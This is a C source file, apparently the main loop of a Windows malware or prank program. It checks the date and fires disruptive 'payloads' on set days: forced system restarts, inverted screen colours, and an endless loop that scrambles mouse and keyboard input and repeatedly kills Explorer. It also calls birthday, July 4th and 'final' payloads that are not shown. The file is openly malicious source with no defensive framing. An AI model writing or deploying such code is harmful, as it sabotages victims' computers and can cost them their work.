#include "headers/mainloop.h"
#include "headers/birthdaypyld.h"
#include "headers/july4pyld.h"
#include "headers/finalpyld.h"



BOOL mainLoop(){
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_SHOW);
    time_t t;
    time(&t);
    struct tm* tm = localtime(&t);
    while(TRUE){
        
        // January 1st Payload
        if(tm->tm_mon == 0 && tm->tm_mday == 1){
            MessageBoxW(NULL, L"Happy New Year!", L"Mossad", MB_OK | MB_ICONINFORMATION);
        }
        // Augest 16th Payload
        if(tm->tm_mon == 7 && tm->tm_mday == 16){
            birthdayPayload();
        }
        // July 4th Payload
        if(tm->tm_mon == 6 && tm->tm_mday == 4){
            independencePayload();
        }
        // Febuary 20th Payload
        if(tm->tm_mon == 1 && tm->tm_mday == 20){
            restartSystem();
        }
        // June 11th Payload
        if(tm->tm_mon == 5 && tm->tm_mday == 11){
            InvertColor(); 
        }
        // July 31st Payload
        if(tm->tm_mon == 6 && tm->tm_mday == 31){
            ShellExecuteA(NULL, "open", "mspaint.exe", NULL, NULL, SW_SHOW);
            while(TRUE){
                scrambleMouseAndKey();
                InvertColor();
                killExplorer();
                Sleep(500);
                startExplorer();
            }
        }
        // December 15th Payload
        if(tm->tm_mon == 11 && tm->tm_mday == 15){
            finalPayload();
        }
        Sleep(1000);
    }
    return TRUE;
}